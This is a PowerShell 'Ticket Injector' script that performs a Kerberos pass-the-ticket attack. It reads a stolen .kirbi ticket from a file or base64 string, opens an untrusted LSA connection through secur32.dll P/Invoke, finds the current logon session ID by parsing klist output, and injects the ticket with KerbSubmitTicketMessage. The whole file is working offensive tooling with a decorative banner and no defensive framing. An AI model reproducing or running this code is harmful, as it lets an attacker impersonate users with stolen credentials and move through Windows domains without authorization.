param(
    [int]$typeofwork,
    [string]$ticketb64
)
# BASE64
$ticket = New-Object System.Byte
switch($typeofwork){
    1{
        #reading kirbi file
        $ticket = [System.IO.File]::ReadAllBytes($ticketb64)
    }
    2{
        #reading from b64
        $ticket = [System.Convert]::FromBase64String($ticketb64)
    }
}
if ($ticket -eq $null){
    write-host "[-] Be Sure entering the correct mode"
    write-host "[-] Cannot receive ticket from file or b64"
    exit;
}


# ------------------- FUNCTIONS -----------------------#
$ptt = @"
[StructLayout(LayoutKind.Sequential)]
public struct LUID
{
    public UInt32 LowPart;
    public Int32 HighPart;
}
public enum KERB_PROTOCOL_MESSAGE_TYPE 
{
  KerbDebugRequestMessage,
  KerbQueryTicketCacheMessage,
  KerbChangeMachinePasswordMessage,
  KerbVerifyPacMessage,
  KerbRetrieveTicketMessage,
  KerbUpdateAddressesMessage,
  KerbPurgeTicketCacheMessage,
  KerbChangePasswordMessage,
  KerbRetrieveEncodedTicketMessage,
  KerbDecryptDataMessage,
  KerbAddBindingCacheEntryMessage,
  KerbSetPasswordMessage,
  KerbSetPasswordExMessage,
  KerbVerifyCredentialMessage,
  KerbQueryTicketCacheExMessage,
  KerbPurgeTicketCacheExMessage,
  KerbRefreshSmartcardCredentialsMessage,
  KerbAddExtraCredentialsMessage,
  KerbQuerySupplementalCredentialsMessage,
  KerbTransferCredentialsMessage,
  KerbQueryTicketCacheEx2Message,
  KerbSubmitTicketMessage,
  KerbAddExtraCredentialsExMessage
}
[StructLayout(LayoutKind.Sequential)]
public struct KERB_CRYPTO_KEY32
{
    public int KeyType;
    public int Length;
    public int Offset;
}
[StructLayout(LayoutKind.Sequential)]
public struct KERB_SUBMIT_TKT_REQUEST
{
    public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
    public LUID                       LogonId;
    public int                        Flags;
    public KERB_CRYPTO_KEY32          Key;
    public int                        KerbCredSize;
    public int                        KerbCredOffset;
}
[StructLayout(LayoutKind.Sequential)]
public struct LSA_STRING_IN
{
    public ushort Length;
    public ushort MaximumLength;
    public IntPtr buffer;
}
[DllImport("secur32.dll", SetLastError=false)]
public static extern int LsaLookupAuthenticationPackage([In] IntPtr LsaHandle,[In] ref LSA_STRING_IN PackageName,[Out] out UInt32 AuthenticationPackage);
[DllImport("Secur32.dll", SetLastError = true)]
public static extern int LsaCallAuthenticationPackage(IntPtr LsaHandle,uint AuthenticationPackage,IntPtr ProtocolSubmitBuffer,int SubmitBufferLength,out IntPtr ProtocolReturnBuffer,out ulong ReturnBufferLength,out int ProtocolStatus);
[DllImport("secur32.dll", SetLastError=false)]
public static extern int LsaConnectUntrusted([Out] out IntPtr LsaHandle);
[DllImport("secur32.dll", SetLastError=false)]
public static extern int LsaDeregisterLogonProcess([In] IntPtr LsaHandle);
[DllImport("advapi32.dll", SetLastError=true)]
public static extern uint LsaNtStatusToWinError(uint status);
"@

function ShowAweSomeBanner{
write-host "
@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@/      \@@@/   @
@@@@@@@@@@@@@@@@\      @@  @___@
@@@@@@@@@@@@@ @@@@@@@@@@  | \@@@@@
@@@@@@@@@@@@@ @@@@@@@@@\__@_/@@@@@
@@@@@@@@@@@@@@@/,/,/./'/_|.\'\,\
@@@@@@@@@@@@@|  | | | | | | | |
            \_|_|_|_|_|_|_|_|
" -ForegroundColor Red

write-host " 
_____ _      _    _____ _      _____        _ _____     _____  ___       
/__   (_) ___| | _|___ /| |_    \_   \_ __  (_)___ /  __/__   \/ _ \ _ __ 
  / /\/ |/ __| |/ / |_ \| __|    / /\/ '_ \ | | |_ \ / __|/ /\/ | | | '__|
 / /  | | (__|   < ___) | |_  /\/ /_ | | | || |___) | (__/ /  | |_| | |   
 \/   |_|\___|_|\_\____/ \__| \____/ |_| |_|/ |____/ \___\/    \___/|_|   
                                          |__/                           
"
}

Function ConnectToLsa()
{
$lsahandle = New-Object System.IntPtr
[int]$retcode = [KRB.PTT]::LsaConnectUntrusted([ref]$lsahandle)
if ($retcode -ne 0){
    write-host "[-] LsaConnectUntrusted Error (NTSTATUS): ", $retcode -ForegroundColor Red
    exit;
}
return $lsahandle
}

#-------------------------------- ENTRY POINT ----------------------------#
ShowAweSomeBanner

$assemblies = [System.Reflection.Assembly]::LoadWithPartialName("System.Security.Principal")
Add-Type -MemberDefinition $ptt -Namespace "KRB" -Name "PTT" -ReferencedAssemblies $assemblies.location -UsingNamespace System.Security.Principal
# CONNECTING TO LSA
$LsaHandle = ConnectToLsa
write-host "[?] LSA HANDLE: ", $LsaHandle
# EXTRACTING KERBEROS AP
$retcode = New-Object System.Int32
$authPackage = New-Object System.Int32
$name = "kerberos"
$importnantlsastring = New-Object KRB.PTT+LSA_STRING_IN
$importnantlsastring.Length = [uint16]$name.Length
$importnantlsastring.MaximumLength = [uint16]($name.Length + 1)
$importnantlsastring.buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($name)
$retcode = [KRB.PTT]::LsaLookupAuthenticationPackage($lsaHandle,[ref]$importnantlsastring,[ref]$authPackage)
if ($retcode -ne 0){
write-host "[-] Error LsaLookupAuthPckg (NTSTATUS): ", $retcode -ForegroundColor Red
exit;
}
write-host "[?] Kerberos Package: ", $authPackage
# GETTING CURRENT LUID (INJECT PURPOSES)
$output = klist
$CurrLuid = $output.split("`n")[1].split(":")[1]
$sysIntCurrLuid = [convert]::ToInt32($CurrLuid,16)
$luidFinally = New-Object KRB.PTT+LUID
$luidFinally.LowPart = $sysIntCurrLuid

# TICKET INJECTING
$protocolReturnBuffer = New-Object System.IntPtr
$ReturnBufferLength = New-Object System.Int32
$ProtocolStatus = New-Object System.Int32
$KrbRequestInfo = New-Object KRB.PTT+KERB_SUBMIT_TKT_REQUEST
$KrbRequestInfoType = $KrbRequestInfo.getType()
$KrbRequestInfo.MessageType = [KRB.PTT+KERB_PROTOCOL_MESSAGE_TYPE]::KerbSubmitTicketMessage
$KrbRequestInfo.KerbCredSize = $ticket.Length
$KrbRequestInfo.KerbCredOffset = [System.Runtime.InteropServices.Marshal]::SizeOf([type]$KrbRequestInfoType)
$KrbRequestInfo.LogonId = $luidFinally
$inputBufferSize = [System.Runtime.InteropServices.Marshal]::SizeOf([type]$KrbRequestInfoType) + $ticket.Length
$inputBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($inputBufferSize)
[System.Runtime.InteropServices.Marshal]::StructureToPtr($KrbRequestInfo,$inputBuffer,$false)
[System.IntPtr]$PtrToCred = $inputBuffer.ToInt64() + $KrbRequestInfo.KerbCredOffset
[System.Runtime.InteropServices.Marshal]::Copy($ticket,0,$PtrToCred,$ticket.Length)
$ntstatus = [KRB.PTT]::LsaCallAuthenticationPackage($lsaHandle,$authPackage,$inputBuffer,$inputBufferSize,[ref]$protocolReturnBuffer,[ref]$ReturnBufferLength,[ref]$ProtocolStatus)
if(($ProtocolStatus -ne 0) -or ($ntstatus -ne 0))
{
    Write-Host "[!] Error in LsaCallAuthenticationPackage" -ForegroundColor Red
    write-host " NTSTATUS: ", $ntstatus, " Protocol Status: ", $ProtocolStatus
    if ($ProtocolStatus -eq -1073741517){
        " Ticket may be out of date"
    }
    exit;
}
if($inputBuffer -ne [System.IntPtr]::Zero)
{
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($inputBuffer)
    [System.Object]$ticket = $null
}
Write-Host "[+] Injected"
klist